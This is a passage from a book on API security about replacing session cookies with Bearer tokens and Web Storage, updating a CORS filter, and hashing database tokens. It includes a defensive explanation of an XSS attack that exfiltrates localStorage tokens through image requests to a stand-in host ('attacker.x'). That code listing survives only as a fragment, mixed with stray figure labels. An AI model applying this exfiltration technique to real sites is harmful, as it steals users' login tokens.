            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + csrfToken    
        }
    })
Of course, you can also rename the csrfToken variable to just token now if you like.
Save the file and restart the API and the duplicate UI on port 9999. Both copies of the
UI will now work fine with no session cookie. Of course, there is still one cookie left to
hold the token between the login page and the natter page, but you can get rid of that
now too.
 Until the release of HTML 5, there were very few alternatives to cookies for storing
tokens in a web browser client. Now there are two widely-supported alternatives:
 The Web Storage API that includes the localStorage and sessionStorage
objects for storing simple key-value pairs.
 The IndexedDB API that allows storing larger amounts of data in a more sophisti-
cated JSON NoSQL database.
Both APIs provide significantly greater storage capacity than cookies, which are typi-
cally limited to just 4KB of storage for all cookies for a single domain. However,
because session tokens are relatively small, you can stick to the simpler Web Storage
API in this chapter. While IndexedDB has even larger storage limits than Web Storage,
it typically requires explicit user consent before it can be used. By replacing cookies
for storage on the client, you will now have a replacement for all three aspects of
token-based authentication provided by cookies, as shown in figure 5.4:
 On the backend, you can manually store cookie state in a database to replace
the cookie storage provided by most web frameworks.
 You can use the Bearer authentication scheme as a standard way to communi-
cate tokens from the client to the API, and to prompt for tokens when not
supplied.
 Cookies can be replaced on the client by the Web Storage API.
Web Storage is simple to use, especially when compared with how hard it was to
extract a cookie in JavaScript. Browsers that support the Web Storage API, which
includes most browsers in current use, add two new fields to the standard JavaScript
window object:
 The sessionStorage object can be used to store data until the browser window
or tab is closed. 
 The localStorage object stores data until it is explicitly deleted, saving the data
even over browser restarts.
Although similar to session cookies, sessionStorage is not shared between browser
tabs or windows; each tab gets its own storage. Although this can be useful, if you use
Pass the token in the 
Authorization field using 
the Bearer scheme.
165
Tokens without cookies
sessionStorage to store authentication tokens then the user will be forced to login
again every time they open a new tab and logging out of one tab will not log them out
of the others. For this reason, it is more convenient to store tokens in localStorage
instead.
 Each object implements the same Storage interface that defines setItem(key,
value), getItem(key), and removeItem(key) methods to manipulate key-value pairs
in that storage. Each storage object is implicitly scoped to the origin of the script that
calls the API, so a script from example.com will see a completely different copy of the
storage to a script from example.org.
TIP
If you want scripts from two sibling sub-domains to share storage, you
can set the document.domain field to a common parent domain in both
scripts. Both scripts must explicitly set the document.domain, otherwise it will
be ignored. For example, if a script from a.example.com and a script from
b.example.com both set document.domain to example.com, then they will
share Web Storage. This is allowed only for a valid parent domain of the script
origin, and you cannot set it to a top-level domain like .com or .org. Setting
the document.domain field also instructs the browser to ignore the port when
comparing origins.
To update the login UI to set the token in local storage rather than a cookie, open
login.js in your editor and locate the line that currently sets the cookie:
    document.cookie = 'token=' + json.token +
        ';Secure;SameSite=strict';
Web browser client
API server
Request
Token store
Authorization: Bearer
JSON/
WWW-Authenticate
Web
storage
Tokens can be stored
in Web Storage instead
of cookies.
The Bearer authentication
scheme can be used to send
tokens and prompt for a token.
Token state can be
manually stored in a
backend database or cache.
Response
Figure 5.4
Cookies can be replaced by Web Storage for storing tokens on the client. The 
Bearer authentication scheme provides a standard way to communicate tokens from the 
client to the API, and a token store can be manually implemented on the backend.
166
CHAPTER 5
Modern token-based authentication
Remove that line and replace it with the following line to set the token in local storage
instead:
    localStorage.setItem('token', json.token);
Now open natter.js and find the line that reads the token from a cookie. Delete that
line and the getCookie function, and replace it with the following:
    let token = localStorage.getItem('token');
That is all it takes to use the Web Storage API. If the token expires, then the API will
return a 401 response, which will cause the UI to redirect to the login page. Once the
user has logged in again, the token in local storage will be overwritten with the new
version, so you do not need to do anything else. Restart the UI and check that every-
thing is working as expected.
5.2.5
Updating the CORS filter
Now that your API no longer needs cookies to function, you can tighten up the CORS
settings. Though you are explicitly sending credentials on each request, the browser is
not having to add any of its own credentials (cookies), so you can remove the Access-
Control-Allow-Credentials headers to stop the browser sending any. If you wanted,
you could now also set the allowed origins header to * to allow requests from any ori-
gin, but it is best to keep it locked down unless you really want the API to be open to
all comers. You can also remove X-CSRF-Token from the allowed headers list. Open
CorsFilter.java in your editor and update the handle method to remove these extra
headers, as shown in listing 5.7.
@Override
public void handle(Request request, Response response) {
    var origin = request.headers("Origin");
    if (origin != null && allowedOrigins.contains(origin)) {
        response.header("Access-Control-Allow-Origin", origin);    
        response.header("Vary", "Origin");                         
    }
    if (isPreflightRequest(request)) {
        if (origin == null || !allowedOrigins.contains(origin)) {
            halt(403);
        }
        response.header("Access-Control-Allow-Headers",
                "Content-Type, Authorization");    
        response.header("Access-Control-Allow-Methods",
                "GET, POST, DELETE");
        halt(204);
    }
}
Listing 5.7
Updated CORS filter
Remove the 
Access-Control-
Allow-Credentials 
header.
Remove X-CSRF-Token 
from the allowed 
headers.
167
Tokens without cookies
Because the API is no longer allowing clients to send cookies on requests, you must
also update the login UI to not enable credentials mode on its fetch request. If you
remember from earlier, you had to enable this so that the browser respected the Set-
Cookie header on the response. If you leave this mode enabled but with credentials
mode rejected by CORS, then the browser will completely block the request and you
will no longer be able to login. Open login.js in your editor and remove the line that
requests credentials mode for the request:
    credentials: 'include',
Restart the API and UI again and check that everything is still working. If it does not
work, you may need to clear your browser cache to pick up the latest version of the
login.js script. Starting a fresh Incognito/Private Browsing page is the simplest way to
do this.3
5.2.6
XSS attacks on Web Storage
Storing tokens in Web Storage is much easier to manage from JavaScript, and it elimi-
nates the CSRF attacks that impact session cookies, because the browser is no longer
automatically adding tokens to requests for us. But while the session cookie could be
marked as HttpOnly to prevent it being accessible from JavaScript, Web Storage
objects are only accessible from JavaScript and so the same protection is not available.
This can make Web Storage more susceptible to XSS exfiltration attacks, although Web
Storage is only accessible to scripts running from the same origin while cookies are
available to scripts from the same domain or any sub-domain by default.
DEFINITION
Exfiltration is the act of stealing tokens and sensitive data from a
page and sending them to the attacker without the victim being aware. The
attacker can then use the stolen tokens to log in as the user from the attacker’s
own device.
If an attacker can exploit an XSS attack (chapter 2) against a browser-based client of
your API, then they can easily loop through the contents of Web Storage and create
an img tag for each item with the src attribute, pointing to an attacker-controlled web-
site to extract the contents, as illustrated in figure 5.5.
 Most browsers will eagerly load an image source URL, without the img even being
added to the page,4 allowing the attacker to steal tokens covertly with no visible indica-
tion to the user. Listing 5.8 shows an example of this kind of attack, and how little
code is required to carry it out.
3 Some older versions of Safari would disable local storage in private browsing mode, but this has been fixed
since version 12.
4 I first learned about this technique from Jim Manico, founder of Manicode Security (https://manicode.com).
168
CHAPTER 5
Modern token-based authentication
for (var i = 0; i 
https://attacker.x?token=xyz . . .
xyz...
The attacker XSS script
queries Web storage
for all tokens.
It creates image tags for
each token, pointing at an
attacker-controlled website.
The img URL includes the
token allowing the attacker
to store it on the website.
Figure 5.5
An attacker can exploit an XSS vulnerability to steal tokens from 
Web Storage. By creating image elements, the attacker can exfiltrate the 
tokens without any visible indication to the user.
Loop through every 
element in localStorage.
Construct an 
img element with 
the src element 
pointing to an 
attacker-
controlled site.
Encode the key and value into the src
URL to send them to the attacker.
169
Tokens without cookies
Chapter 2 covered general defenses against XSS attacks in a REST API. Although a
more detailed discussion of XSS is out of scope for this book (because it is primarily
an attack against a web UI rather than an API), two technologies are worth mention-
ing because they provide significant hardening against XSS:
 The Content-Security-Policy header (CSP), mentioned briefly in chapter 2, pro-
vides fine-grained control over which scripts and other resources can be loaded
by a page and what they are allowed to do. Mozilla Developer Network has a
good introduction to CSP at https://developer.mozilla.org/en-US/docs/Web/
HTTP/CSP.
 An experimental proposal from Google called Trusted Types aims to completely
eliminate DOM-based XSS attacks. DOM-based XSS occurs when trusted Java-
Script code accidentally allows user-supplied HTML to be injected into the DOM,
such as when assigning user input to the .innerHTML attribute of an existing
element. DOM-based XSS is notoriously difficult to prevent as there are many
ways that this can occur, not all of which are obvious from inspection. The
Trusted Types proposal allows policies to be installed that prevent arbitrary
strings from being assigned to these vulnerable attributes. See https://developers
.google.com/web/updates/2019/02/trusted-types for more information.
Pop quiz
2
Which one of the following is a secure way to generate a random token ID?
a
Base64-encoding the user’s name plus a counter.
b
Hex-encoding the output of new Random().nextLong().
Web browser
Cookies
Attacker script
Attacker API
xyz...
Victim API
Cookie: xyz . . .
The attacker script receives
requests from the attacker
over a CORS connection to
the attacker’s server.
The script then makes
requests to the victim API.
The browser will include
cookies as they appear to
come from the same origin.
Figure 5.6
An XSS exploit can be used to proxy requests from the attacker through the 
user’s browser to the API of the victim. Because the XSS script appears to be from the 
same origin as the API, the browser will include all cookies and the script can do anything.
170
CHAPTER 5
Modern token-based authentication
5.3
Hardening database token storage
Suppose that an attacker gains access to your token database, either through direct
access to the server or by exploiting a SQL injection attack as described in chapter 2.
They can not only view any sensitive data stored with the tokens, but also use those
tokens to access your API. Because the database contains tokens for every authenti-
cated user, the impact of such a compromise is much more severe than compromising
a single user’s token. As a first step, you should separate the database server from the
API and ensure that the database is not directly accessible by external clients. Commu-
nication between the database and the API should be secured with TLS. Even if you
do this, there are still many potential threats against the database, as shown in figure 5.7.
If an attacker gains read access to the database, such as through a SQL injection
attack, they can steal tokens and use them to access the API. If they gain write access,
then they can insert new tokens granting themselves access or alter existing tokens to
increase their access. Finally, if they gain delete access then they can revoke other
users’ tokens, denying them access to the API.
5.3.1
Hashing database tokens
Authentication tokens are credentials that allow access to a user’s account, just like a
password. In chapter 3, you learned to hash passwords to protect them in case the
user database is ever compromised. You should do the same for authentication
tokens, for the same reason. If an attacker ever compromises the token database,
they can immediately use all the login tokens for any user that is currently logged in.
Unlike user passwords, authentication tokens have high entropy, so you don’t need to
use an expensive password hashing algorithm like Scrypt. Instead you can use a fast,
cryptographic hash function such as SHA-256 that you used for generating anti-CSRF
tokens in chapter 4.
(continued)
c
Base64-encoding 20 bytes of output from a SecureRandom.
d
Hashing the current time in microseconds with a secure hash function.
e
Hashing the current time together with the user’s password with SHA-256.
3
Which standard HTTP authentication scheme is designed for token-based
authentication?
a
NTLM
b
HOBA
c
Basic
d
Bearer
e
Digest
The answers are at the end of the chapter.
171
Hardening database token storage
Listing 5.9 shows how to add token hashing to the DatabaseTokenStore by reusing
the sha256() method you added to the CookieTokenStore in chapter 4. The token
ID given to the client is the original, un-hashed random string, but the value stored
in the database is the SHA-256 hash of that string. Because SHA-256 is a one-way
hash function, an attacker that gains access to the database won’t be able to reverse
the hash function to determine the real token IDs. To read or revoke the token, you
simply hash the value provided by the user and use that to look up the record in the
database.
@Override
public String create(Request request, Token token) {
    var tokenId = randomId();
    var attrs = new JSONObject(token.attributes).toString();
    database.updateUnique("INSERT INTO " +
        "tokens(token_id, user_id, expiry, attributes) " +
        "VALUES(?, ?, ?, ?)", hash(tokenId), token.username,     
            token.expiry, attrs);
Listing 5.9
Hashing database tokens
Datacenter
API account
DBMS account
API server
Token store
Trust boundaries
TLS
API
clients
Possible SQL
injection attacks
Write access allows new
tokens to be injected or
existing tokens to be modiﬁed.
Read access allows
tokens to be stolen
and then replayed
to the API.
Delete rights would
allow other users’ tokens
to be destroyed.
Figure 5.7
A database token store is subject to several threats, even if you secure the communi-
cations between the API and the database using TLS. An attacker may gain direct access to the 
database or via an injection attack. Read access allows the attacker to steal tokens and gain access 
to the API as any user. Write access allows them to create fake tokens or alter their own token. If 
they gain delete access, then they can delete other users’ tokens, denying them access.
Hash the 
provided token 
when storing 
or looking up in 
the database.
172
CHAPTER 5